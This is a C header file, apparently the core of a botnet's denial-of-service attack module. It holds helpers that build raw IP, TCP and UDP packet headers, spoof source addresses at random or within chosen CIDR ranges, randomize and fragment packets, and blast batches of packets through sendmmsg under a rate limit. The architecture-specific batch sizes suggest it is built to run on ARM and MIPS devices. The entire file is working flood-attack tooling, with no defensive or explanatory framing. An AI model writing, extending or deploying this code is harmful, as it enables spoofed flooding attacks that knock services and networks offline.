#pragma once

#ifndef ATTACK_CORE_H
#define ATTACK_CORE_H

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <sched.h>
#include <errno.h>
#include <poll.h>

#include "protocol.h"
#include "attack_params.h"

#if defined(__aarch64__) || defined(__x86_64__)
    #define BATCH_SIZE 256
#elif defined(__arm__) || defined(__mips__)
    #define BATCH_SIZE 64
#else
    #define BATCH_SIZE 32
#endif

static __thread uint64_t _attack_rand_state[2] = {0, 0};

static inline void attack_rand_init(void) {
    struct timespec _ts;
    clock_gettime(CLOCK_MONOTONIC, &_ts);
    uint64_t t = (uint64_t)_ts.tv_sec ^ ((uint64_t)_ts.tv_nsec << 20)
               ^ (uint64_t)getpid() ^ (uint64_t)(uintptr_t)&_attack_rand_state;
    /* Mix in /dev/urandom entropy if available */
    int _ufd = open("/dev/urandom", O_RDONLY);
    if (_ufd >= 0) {
        uint64_t _rbuf;
        if (read(_ufd, &_rbuf, sizeof(_rbuf)) == (ssize_t)sizeof(_rbuf)) t ^= _rbuf;
        close(_ufd);
    }
    _attack_rand_state[0] = t ^ (t >> 33);
    _attack_rand_state[1] = t ^ (t >> 41) ^ 0xDEADBEEFCAFEBABEULL;
    if (_attack_rand_state[0] == 0) _attack_rand_state[0] = 1;
    if (_attack_rand_state[1] == 0) _attack_rand_state[1] = 2;
}

static inline uint32_t attack_rand_next(void) {
    uint64_t s1 = _attack_rand_state[0];
    const uint64_t s0 = _attack_rand_state[1];
    _attack_rand_state[0] = s0;
    s1 ^= s1 << 23;
    _attack_rand_state[1] = s1 ^ s0 ^ (s1 >> 18) ^ (s0 >> 5);
    return (uint32_t)((_attack_rand_state[1] + s0) >> 32);
}

static inline uint32_t attack_rand_next_full(void) {
    uint64_t s1 = _attack_rand_state[0];
    const uint64_t s0 = _attack_rand_state[1];
    _attack_rand_state[0] = s0;
    s1 ^= s1 << 23;
    _attack_rand_state[1] = s1 ^ s0 ^ (s1 >> 18) ^ (s0 >> 5);
    return (uint32_t)(_attack_rand_state[1] + s0);
}

static inline uint32_t attack_rand_next_range(uint32_t min, uint32_t max) {
    if (min >= max) return min;
    return min + (attack_rand_next_full() % (max - min + 1));
}

typedef struct {
    uint16_t min;
    uint16_t max;
} port_range_t;

#define TCP_OPT_MSS     2
#define TCP_OPT_WSCALE  3
#define TCP_OPT_SACK    4
#define TCP_OPT_TS      8
#define TCP_OPT_NOP     1
#define TCP_OPT_END     0

uint16_t ip_checksum(void* data, size_t len);
uint16_t tcp_udp_checksum(void* data, size_t len, uint32_t src_ip, uint32_t dst_ip, uint8_t protocol);
port_range_t parse_port_range(attack_option* opt);
void build_ip_header(struct iphdr* ip, uint32_t src, uint32_t dst, uint8_t protocol, uint16_t total_len, uint8_t ttl, uint8_t tos);
void apply_ip_frag(struct iphdr* ip, uint8_t frag_mode);
void build_tcp_header(struct tcphdr* tcp, uint16_t src_port, uint16_t dst_port, uint32_t seq, uint32_t ack_seq, uint8_t flags);
void build_udp_header(struct udphdr* udp, uint16_t src_port, uint16_t dst_port, uint16_t data_len);
int build_tcp_options(uint8_t* opts);
void apply_basic_randomization(struct iphdr* ip, struct tcphdr* tcp);
void apply_medium_randomization(struct iphdr* ip, struct tcphdr* tcp);
void apply_full_randomization(struct iphdr* ip, struct tcphdr* tcp, int* delay_us);
int create_raw_socket(void);
int create_udp_socket(void);

static inline uint16_t get_random_port(port_range_t* range) {
    if (!range || range->min == 0) {
        return attack_rand_next_range(1024, 65535);
    }
    if (range->min == range->max) {
        return range->min;
    }
    return attack_rand_next_range(range->min, range->max);
}

static inline uint8_t get_rand_level(attack_params* params) {
    attack_option* opt = find_option(params, OPT_RAND);
    return opt ? get_option_u8(opt) : RAND_NONE;
}

static inline uint8_t get_attack_mode(attack_params* params) {
    attack_option* opt = find_option(params, OPT_MODE);
    return opt ? get_option_u8(opt) : 0;
}

static inline uint16_t get_packet_size(attack_params* params, uint16_t default_size) {
    attack_option* opt = find_option(params, OPT_PSIZE);
    return opt ? get_option_u16(opt) : default_size;
}

static inline uint8_t get_ttl(attack_params* params) {
    attack_option* opt = find_option(params, OPT_TTL);
    return opt ? get_option_u8(opt) : 64;
}

static inline uint8_t get_tos(attack_params* params) {
    attack_option* opt = find_option(params, OPT_TOS);
    return opt ? get_option_u8(opt) : 0;
}

static inline int get_tcp_opts_enabled(attack_params* params) {
    attack_option* opt = find_option(params, OPT_TCPOPTS);
    return opt ? get_option_u8(opt) : 0;
}

static inline uint16_t get_max_conns(attack_params* params, uint16_t default_conns) {
    attack_option* opt = find_option(params, OPT_CONNS);
    return opt ? get_option_u16(opt) : default_conns;
}

static inline uint32_t get_pps_limit(attack_params* params) {
    attack_option* opt = find_option(params, OPT_PPS);
    return opt ? get_option_u32(opt) : 0;
}

static inline uint8_t get_frag_mode(attack_params* params) {
    attack_option* opt = find_option(params, OPT_FRAG);
    return opt ? get_option_u8(opt) : FRAG_NONE;
}

typedef struct {
    uint8_t mode;       /* SPOOF_NONE, SPOOF_RANDOM, SPOOF_CIDR, SPOOF_RANGE */
    uint32_t base_ip;   /* network byte order: base for CIDR, start for RANGE */
    uint32_t end_ip;    /* network byte order: end IP for RANGE */
    uint32_t host_mask; /* host-order mask for CIDR random bits */
    uint8_t prefix;     /* CIDR prefix length */
} spoof_config_t;

static inline spoof_config_t parse_spoof_option(attack_params* params) {
    spoof_config_t cfg = {0};
    attack_option* opt = find_option(params, OPT_SPOOF);
    if (!opt || !opt->data || opt->len < 1) return cfg;

    cfg.mode = opt->data[0];
    switch (cfg.mode) {
        case SPOOF_RANDOM:
            break;
        case SPOOF_CIDR:
            if (opt->len >= 6) {
                memcpy(&cfg.base_ip, opt->data + 1, 4);
                cfg.prefix = opt->data[5];
                if (cfg.prefix > 30) cfg.prefix = 30;
                if (cfg.prefix < 8) cfg.prefix = 8;
                cfg.host_mask = (1U << (32 - cfg.prefix)) - 1;
            } else {
                cfg.mode = SPOOF_NONE;
            }
            break;
        case SPOOF_RANGE:
            if (opt->len >= 9) {
                memcpy(&cfg.base_ip, opt->data + 1, 4);
                memcpy(&cfg.end_ip, opt->data + 5, 4);
            } else {
                cfg.mode = SPOOF_NONE;
            }
            break;
        default:
            cfg.mode = SPOOF_NONE;
            break;
    }
    return cfg;
}

static inline uint32_t generate_spoofed_ip(spoof_config_t* cfg) {
    switch (cfg->mode) {
        case SPOOF_RANDOM:
            return htonl(attack_rand_next());
        case SPOOF_CIDR: {
            uint32_t net = ntohl(cfg->base_ip) & ~cfg->host_mask;
            uint32_t host = attack_rand_next() & cfg->host_mask;
            /* Avoid .0 and .255 for /24 and longer */
            if (cfg->prefix >= 24) {
                host = (host % (cfg->host_mask - 1)) + 1;
            } else if (host == 0) {
                host = 1;
            }
            return htonl(net | host);
        }
        case SPOOF_RANGE: {
            uint32_t start = ntohl(cfg->base_ip);
            uint32_t end = ntohl(cfg->end_ip);
            if (end <= start) return cfg->base_ip;
            uint32_t range = end - start + 1;
            return htonl(start + (attack_rand_next() % range));
        }
        default:
            return 0;
    }
}

typedef struct {
    uint32_t pps_limit;
    uint32_t packets_this_sec;
    struct timespec sec_start;
} pps_tracker_t;

static inline void pps_tracker_init(pps_tracker_t* t, uint32_t limit) {
    t->pps_limit = limit;
    t->packets_this_sec = 0;
    clock_gettime(CLOCK_MONOTONIC, &t->sec_start);
}

static inline int pps_should_send(pps_tracker_t* t, uint32_t batch_size) {
    if (t->pps_limit == 0) return 1;

    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);

    long elapsed_us = (now.tv_sec - t->sec_start.tv_sec) * 1000000L
                    + (now.tv_nsec - t->sec_start.tv_nsec) / 1000L;

    if (elapsed_us >= 1000000L) {
        t->sec_start = now;
        t->packets_this_sec = 0;
    }

    if (t->packets_this_sec + batch_size > t->pps_limit) {
        return 0;
    }
    t->packets_this_sec += batch_size;
    return 1;
}

static inline long pps_sleep_us(pps_tracker_t* t) {
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);

    long elapsed_us = (now.tv_sec - t->sec_start.tv_sec) * 1000000L
                    + (now.tv_nsec - t->sec_start.tv_nsec) / 1000L;

    long remaining = 1000000L - elapsed_us;
    if (remaining <= 0) return 0;
    if (remaining > 100000) remaining = 100000;
    return remaining;
}

static inline int sendmmsg_nonblock(int fd, struct mmsghdr* msgvec, unsigned int vlen) {
    unsigned int sent = 0;
    int retries = 0;

    while (sent < vlen) {
        int ret = sendmmsg(fd, msgvec + sent, vlen - sent, MSG_NOSIGNAL | MSG_DONTWAIT);
        if (ret > 0) {
            sent += ret;
            retries = 0;
        } else if (errno == EAGAIN || errno == EWOULDBLOCK || errno == ENOBUFS) {
            if (++retries > 3) break;
            sched_yield();
        } else {
            break;
        }
    }
    return (int)sent;
}

#endif // ATTACK_CORE_H
